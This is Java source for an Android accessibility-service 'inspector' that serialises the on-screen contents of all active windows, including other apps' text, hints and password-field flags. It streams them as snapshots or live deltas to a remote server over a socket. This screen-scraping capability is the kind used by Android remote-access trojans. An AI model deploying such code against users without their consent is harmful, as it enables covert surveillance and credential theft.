package com.fason.app.features.inspector;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.List;
import java.util.Deque;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

import io.socket.client.Socket;

/**
 * Inspector2 — zero-lag live inspector.
 * Modes:
 *   snapshot  — one-shot full tree (legacy compatible)
 *   live      — event-driven streaming; only node deltas cross the wire
 * Delta encoding: each node gets a stable path-id; the full tree is hashed
 * per-subtree; unchanged subtrees are replaced by a "stable" marker.
 */
public final class Inspector2 {
    private static final String TAG = "Inspector2";
    private static volatile Inspector2 instance;

    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final AtomicBoolean liveMode = new AtomicBoolean(false);
    private final AtomicLong lastEmit = new AtomicLong(0);
    private static final long LIVE_THROTTLE_MS = 120;

    private volatile AccessibilityService service;
    private volatile String lastTreeSignature = "";

    // stable node path -> last fingerprint
    private final Map<String, String> fingerprintMap = new HashMap<>();
    private final Set<String> currentPaths = new HashSet<>();

    private Inspector2() {}

    public static synchronized Inspector2 getInstance() {
        if (instance == null) instance = new Inspector2();
        return instance;
    }

    public void setAccessibilityService(AccessibilityService s) { this.service = s; }

    public boolean isLive() { return liveMode.get(); }

    // ------------------------------------------------------------ legacy API
    public void captureSnapshot(String cmdId) {
        exec.execute(() -> {
            JSONObject tree = buildTree(true);
            if (tree == null) return;
            try {
                tree.put("cmdId", cmdId);
                tree.put("mode", "snapshot");
                emit(tree);
            } catch (Exception ignored) {}
        });
    }

    // ------------------------------------------------------------ live mode
    public void startLive() {
        liveMode.set(true);
        lastTreeSignature = "";
        fingerprintMap.clear();
        emitStatus("live_started");
    }

    public void stopLive() {
        liveMode.set(false);
        emitStatus("live_stopped");
    }

    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!liveMode.get() || event == null) return;
        int t = event.getEventType();
        if (t == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                || t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || t == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            long now = System.currentTimeMillis();
            long last = lastEmit.get();
            if (now - last < LIVE_THROTTLE_MS) return;
            if (!lastEmit.compareAndSet(last, now)) return;
            exec.execute(this::emitDelta);
        }
    }

    // ------------------------------------------------------------ tree build
    private JSONObject buildTree(boolean full) {
        AccessibilityService s = service;
        if (s == null) return null;
        try {
            JSONArray windows = new JSONArray();
            int totalNodes = 0;
            List<AccessibilityWindowInfo> wins = s.getWindows();
            if (wins == null) return null;
            for (AccessibilityWindowInfo w : wins) {
                if (w == null || !w.isActive()) continue;
                AccessibilityNodeInfo root = w.getRoot();
                if (root == null) continue;
                JSONObject win = new JSONObject();
                win.put("windowId", w.getId());
                if (w.getTitle() != null) win.put("title", w.getTitle().toString());
                win.put("layer", w.getLayer());
                win.put("type", windowTypeName(w.getType()));
                JSONObject node = serializeNode(root, "w" + w.getId(), 0, full);
                totalNodes += countNodes(node);
                win.put("root", node);
                root.recycle();
                windows.put(win);
            }
            JSONObject out = new JSONObject();
            out.put("windows", windows);
            out.put("timestamp", System.currentTimeMillis());
            out.put("nodeCount", totalNodes);
            return out;
        } catch (Exception e) {
            return null;
        }
    }

    private JSONObject serializeNode(AccessibilityNodeInfo n, String path, int depth, boolean full) {
        JSONObject o = new JSONObject();
        try {
            o.put("path", path);
            String cls = n.getClassName() != null ? n.getClassName().toString() : "";
            o.put("class", cls);
            String pkg = n.getPackageName() != null ? n.getPackageName().toString() : "";
            if (!pkg.isEmpty()) o.put("package", pkg);
            CharSequence text = n.getText();
            if (text != null && text.length() > 0) o.put("text", text.toString());
            CharSequence desc = n.getContentDescription();
            if (desc != null && desc.length() > 0) o.put("desc", desc.toString());
            CharSequence hint = null;
            if (android.os.Build.VERSION.SDK_INT >= 26) hint = n.getHintText();
            if (hint != null && hint.length() > 0) o.put("hint", hint.toString());
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            o.put("rect", new JSONArray().put(r.left).put(r.top).put(r.right).put(r.bottom));

            int flags = 0;
            if (n.isClickable()) flags |= 1;
            if (n.isLongClickable()) flags |= 2;
            if (n.isScrollable()) flags |= 4;
            if (n.isEditable()) flags |= 8;
            if (n.isEnabled()) flags |= 16;
            if (n.isCheckable()) flags |= 32;
            if (n.isChecked()) flags |= 64;
            if (n.isPassword()) flags |= 128;
            if (n.isSelected()) flags |= 256;
            if (n.isFocused()) flags |= 512;
            if (n.isVisibleToUser()) flags |= 1024;
            o.put("flags", flags);

            String fp = fingerprint(o);
            o.put("fp", fp);

            if (depth < 60 && n.getChildCount() > 0) {
                JSONArray children = new JSONArray();
                for (int i = 0; i < n.getChildCount(); i++) {
                    AccessibilityNodeInfo c = n.getChild(i);
                    if (c == null) continue;
                    String cPath = path + "." + i;
                    if (!full) {
                        String prevFp = fingerprintMap.get(cPath);
                        String cFp = quickFingerprint(c);
                        if (cFp.equals(prevFp)) {
                            JSONObject stable = new JSONObject();
                            stable.put("path", cPath);
                            stable.put("stable", true);
                            children.put(stable);
                            currentPaths.add(cPath);
                            c.recycle();
                            continue;
                        }
                    }
                    children.put(serializeNode(c, cPath, depth + 1, full));
                    c.recycle();
                }
                o.put("children", children);
            }
            currentPaths.add(path);
            fingerprintMap.put(path, fp);
        } catch (Exception ignored) {}
        return o;
    }

    private void emitDelta() {
        currentPaths.clear();
        JSONObject tree = buildTree(false);
        if (tree == null) return;
        try {
            // prune vanished paths
            Set<String> vanished = new HashSet<>(fingerprintMap.keySet());
            vanished.removeAll(currentPaths);
            if (!vanished.isEmpty()) {
                JSONArray gone = new JSONArray();
                for (String p : vanished) { gone.put(p); fingerprintMap.remove(p); }
                tree.put("removed", gone);
            }
            String sig = Integer.toHexString(tree.toString().hashCode());
            if (sig.equals(lastTreeSignature)) return;
            lastTreeSignature = sig;
            tree.put("mode", "delta");
            emit(tree);
        } catch (Exception ignored) {}
    }

    // ------------------------------------------------------------ helpers
    private static String fingerprint(JSONObject o) {
        return Integer.toHexString(o.toString().hashCode());
    }

    private static String quickFingerprint(AccessibilityNodeInfo n) {
        StringBuilder sb = new StringBuilder();
        sb.append(n.getClassName()).append('|');
        sb.append(n.getText()).append('|');
        sb.append(n.getContentDescription()).append('|');
        sb.append(n.getChildCount()).append('|');
        Rect r = new Rect();
        n.getBoundsInScreen(r);
        sb.append(r.flattenToString());
        int flags = 0;
        if (n.isVisibleToUser()) flags |= 1;
        if (n.isChecked()) flags |= 2;
        if (n.isSelected()) flags |= 4;
        if (n.isFocused()) flags |= 8;
        sb.append('|').append(flags);
        return Integer.toHexString(sb.toString().hashCode());
    }

    private static int countNodes(JSONObject n) {
        int c = 1;
        JSONArray children = n.optJSONArray("children");
        if (children != null) {
            for (int i = 0; i < children.length(); i++) {
                JSONObject child = children.optJSONObject(i);
                if (child != null && !child.optBoolean("stable")) c += countNodes(child);
            }
        }
        return c;
    }

    private static String windowTypeName(int type) {
        switch (type) {
            case AccessibilityWindowInfo.TYPE_APPLICATION: return "app";
            case AccessibilityWindowInfo.TYPE_INPUT_METHOD: return "ime";
            case AccessibilityWindowInfo.TYPE_SYSTEM: return "system";
            case AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY: return "a11y";
            case AccessibilityWindowInfo.TYPE_SPLIT_SCREEN_DIVIDER: return "split";
            default: return "unknown";
        }
    }

    private void emitStatus(String status) {
        try {
            JSONObject o = new JSONObject();
            o.put("mode", "status");
            o.put("status", status);
            o.put("timestamp", System.currentTimeMillis());
            emit(o);
        } catch (Exception ignored) {}
    }

    private void emit(JSONObject o) {
        Socket s = SocketClient.getInstance() != null ? SocketClient.getInstance().getSocket() : null;
        if (s != null) s.emit("0xAI", o);
    }
}
